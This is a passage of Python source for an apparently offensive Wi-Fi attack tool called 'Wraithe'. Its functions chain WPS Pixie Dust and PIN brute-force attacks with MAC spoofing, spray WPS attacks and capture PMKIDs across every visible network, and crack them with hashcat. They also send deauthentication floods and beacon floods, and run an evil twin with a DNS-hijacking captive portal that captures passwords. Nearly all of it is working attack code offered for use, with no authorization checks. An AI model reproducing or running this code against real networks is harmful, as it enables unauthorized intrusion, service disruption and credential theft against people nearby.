                     self.monitor, bssid, essid, channel,
                     timeout=60, spoof_mac=True)),
                (5, f"OneShot                    ({G('modern tool')})",
                 lambda: self.wps.oneshot_attack(
                     self.monitor, bssid, channel,
                     timeout=120, spoof_mac=True)),
                (6, f"PIN Brute                  ({Y('100 known + BSSID PINs')})",
                 lambda: self._auto_pin_brute_chain(
                     bssid, channel, essid)),
                (7, f"MIM Attack                 ({Y('reaver MIM')})",
                 lambda: self.wps.mim_attack(
                     self.monitor, bssid, essid, channel,
                     timeout=120)),
            ]

        total = len(chain) + 2  # +2 for PMKID and handshake fallbacks
        result = None

        # ═══ Phase 2: WPS / PIN Attacks ═══
        print(f"  {I('◈')} {B('Phase 2: Attack Chain')}\n")

        for step_num, (step, label, attack_fn) in enumerate(chain, 1):
            print(f"  {I(f'[{step_num}/{total}]')} {B(label.split('  ')[0].strip())}")
            print(f"  {D(f'  {label}')}")
            print()
            try:
                result = attack_fn()
            except KeyboardInterrupt:
                self.wps.stop()
                print(f"\n  {Y('Attack cancelled. Returning to menu.')}")
                input("  Press Enter...")
                return

            if result and result.get('success'):
                return self._auto_hack_success(result, step_num, total)

            print(f"  {Y('✖ No key.')}\n")

        # ═══ Phase 3: Passive Fallbacks ═══
        if wps_good:
            print(f"  {Y('WPS methods exhausted. Trying passive captures...')}\n")

        for step, (name, attack_fn) in enumerate([
            ('PMKID Capture (passive)',
             lambda: self.other.capture_pmkid(self.monitor, bssid, channel, timeout=60)),
            ('Handshake Capture (deauth + capture)',
             lambda: self.other.capture_handshake(self.monitor, bssid, channel, essid, timeout=90)),
        ], len(chain) + 1):
            print(f"  {I(f'[{step}/{total}]')} {B(name)}")
            print(f"  {D('  Passive — no brute force')}")
            print()
            try:
                result = attack_fn()
            except KeyboardInterrupt:
                self.other.stop()
                print(f"\n  {Y('Capture cancelled.')}")
                input("  Press Enter...")
                return

            if result and result.get('success'):
                is_pmkid = 'PMKID' in name
                badge = 'PMKID CAPTURED' if is_pmkid else 'HANDSHAKE CAPTURED'
                crack_cmd = 'hashcat -m 16802' if is_pmkid else 'aircrack-ng or hashcat + wordlist'
                print(f"\n  {' '}{C['bg_ok']}{C['bold']}  ✔  {badge}  {C['reset']}")
                print(f"  {D('File:')} {G(result.get('file', ''))}")
                print(f"  {D(f'Crack offline with: {crack_cmd}')}\n")
                input("  Press Enter...")
                return

            print(f"  {Y(f'✖ {name} failed.')}\n")

        # All methods exhausted
        print(f"\n  {Rc('═'*50)}")
        print(f"  {Rc('✖  ALL ATTACK METHODS EXHAUSTED')}")
        print(f"  {Rc('No password recovered.')}")
        print(f"  {Rc('═'*50)}")
        print(f"\n  {D('Troubleshooting:')}")
        print(f"  {D('  • Move closer to target (signal:')} {signal} {D('dBm)')}")
        print(f"  {D('  • Check if target has WPS disabled')}")
        print(f"  {D('  • Try a different wireless card')}")
        print(f"  {D('  • Make sure you are on the correct channel')}")
        input("\n  Press Enter...")

    def _auto_pin_brute_chain(self, bssid, channel, essid):
        """PIN brute with aggressive PIN list for auto hack"""
        pins = self.wps.load_known_pins()
        bssid_pins = self.wps.generate_pins_from_bssid(bssid)
        pins = list(dict.fromkeys(pins + bssid_pins))[:100]
        if not pins:
            return None
        print(f"  {D(f'  Testing {len(pins)} PINs...')}")
        return self.wps.pin_brute(
            self.monitor, bssid, pins, essid, channel,
            timeout=180, lock_wait=30, spoof_mac=True)

    def _auto_hack_success(self, result, step, total):
        """Display success result from auto_hack chain"""
        wpa_key = result.get('wpa_key')
        wps_pin = result.get('wps_pin') or result.get('pin')
        print(f"\n  {' '}{C['bg_ok']}{C['bold']}  ✔  PASSWORD FOUND  {C['reset']}")
        print(f"  {' '}{D(f'Step {step}/{total}')}\n")
        if wpa_key:
            print(f"  {B('WPA Key:')}  {K(wpa_key)}")
        if wps_pin:
            print(f"  {B('WPS PIN:')}  {K(wps_pin)}")
        if result.get('keys'):
            for k in result['keys']:
                print(f"  {G(k)}")

        # Auto-log
        t = self.selected_target
        essid = t.get('essid', '?') if t else '?'
        self.log(f'[!!!] AUTO HACK SUCCESS — {essid} — Key: {wpa_key or "?"} — PIN: {wps_pin or "?"}')
        print(f"\n  {D('Result logged.')}")
        input("\n  Press Enter...")
        return

    def global_wps_spray(self):
        """Y — Try WPS Pixie Dust on ALL visible networks, report results"""
        if not self.require_monitor():
            return
        if not self.targets:
            print(f"\n  {Y('No targets.')} Scan first ({B('S')}).")
            input("  Press Enter...")
            return

        self._interrupted = False
        self.clear()
        self.banner()
        print(f"\n  {B(T('═══ GLOBAL WPS SPRAY ═══'))}\n")
        print(f"  {I('Testing WPS on ALL networks...')}\n")
        print(f"  {Y('Press Ctrl+C to stop early')}\n")

        results = {'cracked': [], 'available': [], 'locked': [], 'failed': []}
        total = len(self.targets)

        try:
            for i, t in enumerate(self.targets):
                if self._interrupted:
                    break

                bssid = t.get('bssid', '')
                essid = t.get('essid', '?')
                channel = t.get('channel', '')
                tag = (essid[:20] + '..') if len(essid) > 20 else essid
                print(f"\n  {I(f'[{i+1}/{total}]')} {B(tag):<22s} {D(bssid)}")
                print(f"  {D('─'*50)}")

                if len(bssid) < 10:
                    print(f"  {Y('  Skip — no BSSID')}")
                    results['failed'].append(t)
                    continue

                # Quick WPS check
                print(f"  {Y('  WPS?')} ", end='', flush=True)
                try:
                    wps_info = self.wps.check_lock_status(self.monitor, bssid)
                    locked = wps_info.get('locked')
                except:
                    locked = None

                if locked is True:
                    print(f"{Rc('LOCKED')}")
                    results['locked'].append(t)
                    continue
                elif locked is False:
                    print(f"{G('OPEN')}")
                else:
                    print(f"{Y('?')}")
                    results['failed'].append(t)
                    continue

                # Pixie mode 1
                print(f"  {D('  → Pixie 1...')}")
                try:
                    result = self.wps.pixie_dust_reaver(
                        self.monitor, bssid, essid, channel,
                        timeout=45, pixie_mode='1', spoof_mac=True)
                except:
                    result = None
                if self._interrupted: break
                if result and result.get('success'):
                    self._spray_hit(results, t, result)
                    continue

                # Pixie mode 2
                print(f"  {D('  → Pixie 2...')}")
                try:
                    result = self.wps.pixie_dust_reaver(
                        self.monitor, bssid, essid, channel,
                        timeout=45, pixie_mode='2', spoof_mac=True)
                except:
                    result = None
                if self._interrupted: break
                if result and result.get('success'):
                    self._spray_hit(results, t, result)
                    continue

                # Bully
                print(f"  {D('  → Bully...')}")
                try:
                    result = self.wps.pixie_dust_bully(
                        self.monitor, bssid, essid, channel,
                        timeout=45, spoof_mac=True)
                except:
                    result = None
                if self._interrupted: break
                if result and result.get('success'):
                    self._spray_hit(results, t, result)
                    continue

                print(f"  {Y('  ✖ No key')}")
                results['available'].append(t)

        except KeyboardInterrupt:
            self.stop_all()
            print(f"\n  {Y('  Interrupted.')}")

        finally:
            self.wps.stop()
            self.other.stop()

        # ── Report ──
        self.clear()
        self.banner()
        print(f"\n  {B(T('═══ SPRAY RESULTS ═══'))}\n")

        if results['cracked']:
            print(f"  {G('✔ CRACKED:')}\n")
            for t in results['cracked']:
                e = t.get('essid','?')
                k = t.get('wpa_key','?')
                p = t.get('wps_pin','?')
                print(f"  {G('✔')} {B(e)}  {D('Key:')} {K(k)}  {D('PIN:')} {K(p)}")
            print()

        if results['available']:
            print(f"  {Y('Open but no crack:')} {len(results['available'])}")
            for t in results['available']:
                print(f"  {Y('  •')} {t.get('essid','?')}  {D(t.get('bssid','?'))}")
            print()

        if results['locked']:
            print(f"  {Rc('Locked:')} {len(results['locked'])}")
            for t in results['locked']:
                print(f"  {Rc('  •')} {t.get('essid','?')}  {D(t.get('bssid','?'))}")
            print()

        tested = len(results['cracked']) + len(results['available']) + len(results['locked'])
        nc = len(results['cracked'])
        na = len(results['available'])
        nl = len(results['locked'])
        print(f"  {D('─'*40)}")
        print(f"  {D('Tested:')} {tested}/{total}  "
              f"{G(f'Cracked: {nc}')}  "
              f"{D(f'Open: {na}')}  "
              f"{Rc(f'Locked: {nl}')}")
        print()
        input("  Press Enter...")

    def _spray_hit(self, results, target, result):
        """Record a WPS spray hit"""
        key = result.get('wpa_key', '?')
        pin = result.get('wps_pin', '?')
        essid = target.get('essid', '?')
        print(f"\n  {G('✔ CRACKED!')}  {B('Key:')} {K(key)}  {B('PIN:')} {K(pin)}")
        results['cracked'].append({**target, 'wpa_key': key, 'wps_pin': pin})
        self.log(f'[WPS SPRAY] CRACKED {essid} — Key: {key} — PIN: {pin}')

    def global_hash_sweep(self):
        """Z — Capture ALL PMKID/handshakes, try 10 common passwords"""
        if not self.require_monitor():
            return
        if not self.targets:
            print(f"\n  {Y('No targets.')} Scan first ({B('S')}).")
            input("  Press Enter...")
            return

        self._interrupted = False
        self.clear()
        self.banner()
        print(f"\n  {B(T('═══ GLOBAL HASH SWEEP ═══'))}\n")
        print(f"  {I('Capture PMKID/handshakes from ALL networks')}")
        print(f"  {I('Then try 10 common passwords')}\n")
        print(f"  {Y('Ctrl+C to stop early')}\n")

        # ── Phase 1: bulk capture (60s, no filter = all networks) ──
        print(f"  {B('Phase 1:')} {D('Bulk capture (60s)')}")
        timestamp = int(time.time())
        output_dir = f'/tmp/wraithe_sweep_{timestamp}'
        os.makedirs(output_dir, exist_ok=True)
        pcap_file = os.path.join(output_dir, 'sweep.pcapng')
        hash_file = os.path.join(output_dir, 'sweep.hc22000')

        proc = None
        try:
            subprocess.run(['airmon-ng', 'check', 'kill'],
                          capture_output=True, text=True, timeout=15)
            proc = subprocess.Popen(
                ['hcxdumptool', '-o', pcap_file, '-i', self.monitor,
                 '--enable_status=15', '--tot=10'],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            for sec in range(60):
                if self._interrupted:
                    break
                time.sleep(1)
                if sec % 15 == 0 and sec > 0:
                    print(f"  {D(f'  ...{sec}s')}")
        except KeyboardInterrupt:
            self.stop_all()
            print(f"\n  {Y('  Interrupted.')}")
        except Exception as e:
            print(f"\n  {Rc(f'Error: {e}')}")
        finally:
            if proc:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except:
                    try:
                        proc.kill()
                    except:
                        pass

        # Check results
        has_hashes = False
        pmkid_count = 0
        handshake_count = 0
        nets_seen = set()

        if os.path.exists(pcap_file) and os.path.getsize(pcap_file) > 100:
            print(f"\n  {G('✔')} Captured {os.path.getsize(pcap_file)} bytes")
            try:
                subprocess.run(['hcxpcapngtool', '-o', hash_file, pcap_file],
                              capture_output=True, text=True, timeout=60)
            except:
                pass
            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 20:
                has_hashes = True
                with open(hash_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        if '*01*' in line:
                            pmkid_count += 1
                        elif '*02*' in line or '*03*' in line:
                            handshake_count += 1
                        try:
                            parts = line.split('*')
                            if len(parts) >= 5:
                                nets_seen.add(parts[4])
                        except:
                            pass

        print(f"\n  {D('PMKID:')} {pmkid_count}  {D('Handshake:')} {handshake_count}  "
              f"{D('Nets:')} {len(nets_seen)}")

        if not has_hashes:
            print(f"\n  {Y('No hashes captured.')}  {D('Move closer or increase scan time.')}")
            input("\n  Press Enter...")
            return

        # ── Phase 2: try 10 common passwords via hashcat ──
        print(f"\n  {'─'*50}")
        print(f"\n  {B('Phase 2:')} {D('Trying 10 common passwords')}")

        # Only these 10 passwords — simple and fast
        top10 = [
            '12345678', '123456789', '1234567890',
            '00000000', '11111111', '88888888',
            'password', 'admin', '1234', '12345',
        ]

        wordlist_path = os.path.join(output_dir, 'top10.txt')
        with open(wordlist_path, 'w') as f:
            for p in top10:
                f.write(p + '\n')

        potfile = os.path.join(output_dir, 'cracked.pot')
        cracked = {}

        try:
            # hashcat mode 22000 with our 10 passwords
            subprocess.run([
                'hashcat', '-m', '22000', '-a', '0',
                hash_file, wordlist_path,
                '--force', '-O', '-w', '4',
                '--potfile-path', potfile,
            ], capture_output=True, text=True, timeout=60)
        except:
            pass

        # Read results
        if os.path.exists(potfile):
            with open(potfile, 'r') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        pw = line.split(':')[-1]
                        hpref = line.split(':')[0][:40]
                        # Match to targets
                        for t in self.targets:
                            b = t.get('bssid', '').replace(':', '')[:6]
                            if b and b in hpref:
                                e = t.get('essid', '?')
                                if e not in cracked:
                                    cracked[e] = pw

        # Report
        self.clear()
        self.banner()
        print(f"\n  {B(T('═══ SWEEP RESULTS ═══'))}\n")

        if cracked:
            print(f"  {G('✔ MATCHED:')}\n")
            for essid, pw in sorted(cracked.items()):
                print(f"  {G('✔')} {B(essid)}  {K(pw)}")
        else:
            print(f"  {Y('No matches with top 10 passwords.')}")

        print(f"\n  {D('Hashes:')} {hash_file}")
        print(f"\n  {Y('To try more:')} {D('hashcat -m 22000')} {hash_file} {D('/path/to/wordlist')}")
        input("\n  Press Enter...")

    def show_attack_result(self, result):
        if not result:
            print(f"\n  {Rc('✖')} Attack failed or no result.")
            input("  Press Enter...")
            return

        print(f"\n  {D('═'*50)}")
        print(f"  {B('Attack Result')}")
        print(f"  {D('═'*50)}")

        if result.get('success'):
            print(f"\n  {' '}{C['bg_ok']}{C['bold']}  ✔  SUCCESS  {C['reset']}")
            if result.get('wpa_key'):
                print(f"\n  {B('WPA Key:')}  {K(result['wpa_key'])}")
            if result.get('wps_pin'):
                print(f"  {B('WPS PIN:')}  {K(result['wps_pin'])}")
            if result.get('keys'):
                for k in result['keys']:
                    print(f"  {G(k)}")
        else:
            print(f"\n  {Rc('✖')} No key recovered.")
            self.log(f'Attack completed: no key recovered')

        output = result.get('output', '')
        if output:
            print(f"\n  {D('─── Last output ───')}")
            for line in output.split('\n')[-10:]:
                if line.strip():
                    print(f"  {line[:120]}")

        input(f"\n  Press Enter...")

    # ── Other Attacks ──

    def capture_handshake(self):
        bssid, channel, essid = self.get_target_params()
        if not bssid:
            return

        self.clear()
        self.banner()
        print(f"\n  {B('Handshake Capture')}\n")
        print(f"  {D('Target:')} {bssid}  {D('CH:')}{channel}")
        print(f"  {Y('Deauth packets will be sent to speed up capture')}")
        print(f"  {Y('Press Ctrl+C to stop early')}\n")

        result = self.other.capture_handshake(
            self.monitor, bssid, channel, essid,
            timeout=int(self.config.get('handshake', {}).get('capture_timeout', 120))
        )

        if result.get('success'):
            print(f"\n  {' '}{C['bg_ok']}{C['bold']}  ✔  HANDSHAKE CAPTURED  {C['reset']}")
            print(f"  {D('File:')} {G(result.get('file'))}")
        else:
            print(f"\n  {Y('No handshake captured.')}")
            if result.get('file'):
                print(f"  {D('Partial capture:')} {result.get('file')}")

        input("\n  Press Enter...")

    def capture_pmkid(self):
        bssid, channel, essid = self.get_target_params()
        if not bssid:
            return

        self.clear()
        self.banner()
        print(f"\n  {B('PMKID Capture')}\n")
        print(f"  {D('Target:')} {bssid}  {D('CH:')}{channel}")
        print(f"  {Y('Works against WPA2/WPA3 with 11w/r features')}")

        result = self.other.capture_pmkid(
            self.monitor, bssid, channel,
            timeout=int(self.config.get('pmkid', {}).get('capture_timeout', 60))
        )

        if result.get('success'):
            print(f"\n  {' '}{C['bg_ok']}{C['bold']}  ✔  PMKID CAPTURED  {C['reset']}")
            print(f"  {D('File:')} {G(result.get('file'))}")
        else:
            print(f"\n  {Y('No PMKID captured.')}")

        input("\n  Press Enter...")

    def do_deauth(self):
        bssid, channel, essid = self.get_target_params()
        if not bssid:
            return

        print(f"\n  {Y('Sending deauth')} to {bssid}...")
        result = self.other.deauth_attack(self.monitor, bssid, count=10)
        if result.get('success'):
            print(f"  {G('✔')} Deauth sent.")
        else:
            print(f"  {Rc('✖')} Deauth failed.")

        input("  Press Enter...")

    def do_beacon_flood(self):
        self.clear()
        self.banner()
        print(f"\n  {B('Beacon Flood')}\n")

        try:
            count = input(f"  Number of fake APs {D('[50]')}: ").strip()
            count = int(count) if count else 50
        except:
            count = 50

        print(f"\n  {Y('Flooding')} with {count} fake APs for 30s...")
        result = self.other.beacon_flood(self.monitor, essids=count, timeout=30)

        if result.get('success'):
            print(f"  {G('✔')} Beacon flood complete.")
        else:
            print(f"  {Rc('✖')} Failed: {result.get('error', 'unknown')}")

        input("  Press Enter...")

    def client_deauth(self):
        bssid, channel, essid = self.get_target_params()
        if not bssid:
            return

        self.clear()
        self.banner()
        print(f"\n  {B(T('═══ Client Deauth ═══'))}\n")
        print(f"  {D('AP:')} {essid} ({bssid})  {D('CH:')}{channel}")
        print(f"\n  {Y('Scanning for connected clients...')}")

        # Scan for clients
        result = subprocess.run(
            ['airodump-ng', '-d', bssid, '-a', self.monitor,
             '--output-format', 'csv', '-w', '/tmp/wraithe_client_scan',
             '-t', '5'],
            capture_output=True, text=True, timeout=10)

        time.sleep(4)
        result = subprocess.run(
            ['airodump-ng', '-d', bssid, '-a', self.monitor,
             '--output-format', 'csv', '-w', '/tmp/wraithe_client_scan',
             '-t', '1'],
            capture_output=True, text=True, timeout=5)
        time.sleep(3)

        clients = []
        try:
            csv_path = '/tmp/wraithe_client_scan-01.csv'
            if os.path.exists(csv_path):
                with open(csv_path) as f:
                    in_clients = False
                    for line in f:
                        if 'Station MAC' in line or 'BSSID' in line:
                            in_clients = True
                            continue
                        if in_clients and line.strip():
                            parts = line.split(',')
                            if len(parts) >= 1 and ':' in parts[0]:
                                clients.append(parts[0].strip())
                            elif len(parts) >= 6 and ':' in parts[0]:
                                clients.append(parts[0].strip())
        except:
            pass

        for f in glob.glob('/tmp/wraithe_client_scan*'):
            try: os.remove(f)
            except: pass

        if not clients:
            print(f"\n  {Y('No clients found.')}")
            print(f"  {B('Options:')}")
            print(f"  {G('1')} Broadcast deauth (all clients)")
            print(f"  {G('2')} Enter client MAC manually")
            c = input(f"\n  Select {D('[1]')}: ").strip() or '1'

            if c == '1':
                self.do_deauth()
            elif c == '2':
                client_mac = input("  Client MAC: ").strip().upper()
                if client_mac:
                    self._send_deauth(bssid, client_mac, channel)
            return

        print(f"\n  {G('Found')} {len(clients)} clients:\n")
        for i, mac in enumerate(clients[:20], 1):
            print(f"  {G(f'[{i}]')} {mac}")
        print(f"  {G('[A]')} All clients (broadcast)")
        print(f"  {G('[M]')} Manual MAC entry")

        choice = input(f"\n  Select client: ").strip().upper()

        if choice == 'A':
            self._send_deauth(bssid, None, channel)
        elif choice == 'M':
            client_mac = input("  Client MAC: ").strip().upper()
            if client_mac:
                self._send_deauth(bssid, client_mac, channel)
        else:
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(clients):
                    self._send_deauth(bssid, clients[idx], channel)
                else:
                    print(f"  {Rc('Invalid.')}")
                    input("  Press Enter...")
            except:
                print(f"  {Rc('Invalid.')}")
                input("  Press Enter...")

    def _send_deauth(self, bssid, client_mac=None, channel=None):
        if channel:
            subprocess.run(['iw', 'dev', self.monitor, 'set', 'channel', str(channel)],
                          capture_output=True, timeout=5)

        try:
            count = int(input(f"  Deauth packets {D('[10]')}: ").strip() or '10')
        except:
            count = 10

        print(f"\n  {Y('Sending')} {count} deauths...")

        if client_mac:
            cmd = ['aireplay-ng', '-0', str(count), '-a', bssid,
                   '-c', client_mac, '--ignore-negative-one', self.monitor]
            self.log(f'Deauth client {client_mac}')
        else:
            cmd = ['aireplay-ng', '-0', str(count), '-a', bssid,
                   '--ignore-negative-one', self.monitor]
            self.log(f'Broadcast deauth on {bssid}')

        subprocess.run(cmd, capture_output=True, timeout=30)
        print(f"  {G('✔')} Done.")
        input("  Press Enter...")

    def auto_crack_handshake(self):
        self.clear()
        self.banner()
        print(f"\n  {B(T('═══ Auto-Crack Handshake ═══'))}\n")

        import glob
        hccapx_files = glob.glob('/tmp/wraithe_handshake/*.hccapx') + glob.glob('/tmp/wraithe_handshake/*.hccap')
        cap_files = glob.glob('/tmp/wraithe_handshake/*.cap') + glob.glob('/tmp/wraithe_handshake/*.pcap')

        if not cap_files and not hccapx_files:
            print(f"  {Y('No captured handshake files found.')}")
            print(f"  {D('Capture a handshake first')}")
            input("  Press Enter...")
            return

        print(f"  {G('Found')} {len(cap_files)} capture files:\n")
        for i, f in enumerate(cap_files + hccapx_files, 1):
            size = os.path.getsize(f)
            print(f"  {G(f'[{i}]')} {os.path.basename(f)} ({size} bytes)")

        idx = input(f"\n  Select file {D('[1]')}: ").strip() or '1'
        try:
            i = int(idx) - 1
            all_files = cap_files + hccapx_files
            if 0 <= i < len(all_files):
                selected = all_files[i]
            else:
                selected = (cap_files + hccapx_files)[0]
        except:
            selected = (cap_files + hccapx_files)[0]

        wordlists = []
        for d in ['/usr/share/wordlists', '/usr/share/wordlists/rockyou.txt',
                   '/usr/share/seclists/Passwords', '/opt']:
            wl = glob.glob(f'{d}*wordlist*') + glob.glob(f'{d}*rockyou*') + glob.glob(f'{d}*password*')
            for w in wl:
                if os.path.isfile(w) and os.path.getsize(w) > 1000:
                    wordlists.append(w)
            break

        if not wordlists:
            wordlists = [w for w in glob.glob('/usr/share/wordlists/*') if os.path.isfile(w)]

        print(f"\n  {B('Wordlists available:')}")
        if not wordlists:
            print(f"  {Y('No wordlists found.')} Enter a path.")
            wl_path = input("  Wordlist path: ").strip()
            if not wl_path or not os.path.exists(wl_path):
                print(f"  {Rc('Wordlist not found.')}")
                input("  Press Enter...")
                return
        else:
            for i, wl in enumerate(wordlists[:5], 1):
                size_mb = os.path.getsize(wl) / 1024 / 1024
                print(f"  {G(f'[{i}]')} {wl} ({size_mb:.1f} MB)")
            wl_choice = input(f"\n  Select wordlist {D('[1]')}: ").strip() or '1'
            try:
                wl_path = wordlists[int(wl_choice)-1]
            except:
                wl_path = wordlists[0]

        print(f"\n  {Y('Running hashcat...')} {D('(may take long)')}")
        print(f"  {D('Ctrl+C to stop')}\n")

        if selected.endswith('.hccapx'):
            cmd = ['hashcat', '-m', '2500', '-a', '0', selected, wl_path, '--force', '-O', '--status']
        elif selected.endswith('.hccap'):
            cmd = ['hashcat', '-m', '2500', '-a', '0', selected, wl_path, '--force', '-O', '--status']
        else:
            self.log('Converting .cap to .hccapx...')
            hccapx_out = selected.replace('.cap', '.hccapx').replace('.pcap', '.hccapx')
            convert = subprocess.run(
                ['cap2hccapx', selected, hccapx_out],
                capture_output=True, text=True, timeout=30
            )
            if os.path.exists(hccapx_out):
                cmd = ['hashcat', '-m', '2500', '-a', '0', hccapx_out, wl_path, '--force', '-O', '--status']
            else:
                print(f"  {Rc('Could not convert .cap file.')}")
                self.log(f'cap2hccapx failed: {convert.stderr[:200]}')
                input("  Press Enter...")
                return

        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            start = time.time()
            timeout = 300
            cracked = None

            while time.time() - start < timeout:
                line = proc.stdout.readline()
                if not line and proc.poll() is not None:
                    break
                line_s = line.strip()
                if line_s:
                    print(f"  {line_s[:120]}")
                if 'Cracked' in line_s:
                    cracked = line_s
                if line_s and ':' in line_s and len(line_s.split(':')[0]) == 64:
                    parts = line_s.split(':')
                    if len(parts) >= 2:
                        self.log(f'[!] Cracked: {parts[1][:64]}')

            proc.terminate()

            potfile = subprocess.run(
                ['hashcat', '-m', '2500', '--show', selected, '--force'],
                capture_output=True, text=True, timeout=10
            )
            if potfile.stdout.strip():
                result_line = potfile.stdout.strip().split('\n')[0]
                parts = result_line.split(':')
                if len(parts) >= 2:
                    psk = parts[-1]
                    print(f"\n  {' '}{C['bg_ok']}{C['bold']}  ✔  CRACKED  {C['reset']}")
                    print(f"  PSK: {K(psk)}")
                    self.log(f'[!!!] Handshake cracked: {psk}')

        except Exception as e:
            self.log(f'Crack error: {e}')

        input("\n  Press Enter...")

    def evil_twin_attack(self):
        if not self.require_monitor():
            return

        bssid, channel, essid = self.get_target_params()
        if not bssid or not essid or essid == '<Hidden SSID>':
            print(f"\n  {Rc('Need a valid target with visible ESSID.')}")
            essid = input("  ESSID to clone: ").strip()
            if not essid:
                return
            if not bssid:
                bssid = input("  BSSID of real AP (for deauth): ").strip().upper()
            if not channel:
                channel = input("  Channel: ").strip()

        self.clear()
        self.banner()
        print(f"\n  {B(T('═══ Evil Twin Attack ═══'))}\n")
        print(f"  {D('Cloning:')} {B(essid)}")
        print(f"  {D('Real AP:')} {bssid}")
        print(f"  {D('Channel:')} {channel}")
        print(f"  {D('Interface:')} {self.monitor}")
        print(f"\n  {Y('Single wireless driver mode')} — airbase-ng handles it all")
        print(f"  {Y('The real AP will be de-authed to push clients to the fake')}")
        print(f"\n  {D('Note: DNS responses on port 53 will be hijacked to the portal')}")

        print(f"\n  {B('Configure:')}")
        portal_port = input(f"  Captive portal port {D('[80]')}: ").strip() or '80'
        deauth_count = input(f"  Deauth packets per burst {D('[10]')}: ").strip() or '10'
        timeout = input(f"  Max wait time in seconds {D('[300]')}: ").strip() or '300'

        try:
            portal_port = int(portal_port)
            deauth_count = int(deauth_count)
            timeout = int(timeout)
        except:
            portal_port, deauth_count, timeout = 80, 10, 300

        print(f"\n  {Rc('This will switch interface from monitor to AP mode.')}")
        confirm = input(f"  Continue? {D('[y/N]')}: ").strip().lower()
        if confirm != 'y':
            return

        print(f"\n  {D('═'*50)}")
        result = self.evil_twin.run(
            self.monitor, essid, bssid, channel,
            deauth_count=deauth_count,
            portal_port=portal_port,
            timeout=timeout
        )
        print(f"  {D('═'*50)}")

        if result.get('success'):
            print(f"\n  {' '}{C['bg_ok']}{C['bold']}  ✔  CREDENTIALS CAPTURED  {C['reset']}")
            print(f"  {D('ESSID:')} {result.get('essid', '?')}")
            print(f"  {B('Password:')} {K(result.get('password', '?'))}")
            if result.get('file'):
                print(f"  {D('Saved to:')} {result.get('file')}")
        else:
            print(f"\n  {Y('No credentials captured.')}")

        input("\n  Press Enter...")

    def spoof_mac(self):
        if not self.interface:
            print(f"  {Y('No interface selected.')}")
            input("  Press Enter...")
            return

        mac = self.iface_mgr.spoof_mac(self.interface)
        if mac:
            print(f"  {G('✔')} MAC spoofed to {K(mac)}")
            self.log(f'MAC spoofed: {mac}')
        else:
            print(f"  {Rc('✖')} MAC spoofing failed.")

        input("  Press Enter...")

    # ── Logs ──

    def view_log(self):
        self.clear()
        self.banner()
        print(f"\n  {B('Session Log')}\n")
        for msg in self.log_messages[-50:]:
            print(f"  {msg[:200]}")
        if not self.log_messages:
            print(f"  {D('(empty)')}")
        input(f"\n  Press Enter...")

    # ── Quit ──

    def quit(self):
        print(f"\n  {Y('Cleaning up...')}")
        self.evil_twin.stop()
        self.iface_mgr.cleanup()
        self.wps.stop()
        self.other.stop()
        self._running = False
        print(f"  {G('✔')} Goodbye.\n")

    # ── Run ──

    def run(self):
        try:
            self.clear()
            self.banner()
            print(f"\n  {B('Starting Wraithe...')}\n")

            ifaces = self.iface_mgr.get_all_interfaces()
            if ifaces:
                self.interface = ifaces[0]
                self.log(f'Detected interface: {self.interface}')
                print(f"  {D('Interface:')} {G(self.interface)}")
            else:
                print(f"  {Y('No wireless interfaces detected.')}")

            print(f"\n  {D('Type')} {B('I')} {D('to set up monitor mode.')}")
            time.sleep(1.5)

            self.menu_main()
        except KeyboardInterrupt:
            print(f"\n\n  {Y('Interrupted.')}")
            self.quit()
        except Exception as e:
            print(f"\n  {Rc('Error:')} {e}")
            self.quit()


def main():
    if os.geteuid() != 0:
        print(f"{Rc('[!]')} Wraithe must run as root (for monitor mode).")
        sys.exit(1)

    app = Wraithe()
    app.run()


if __name__ == '__main__':
    main()
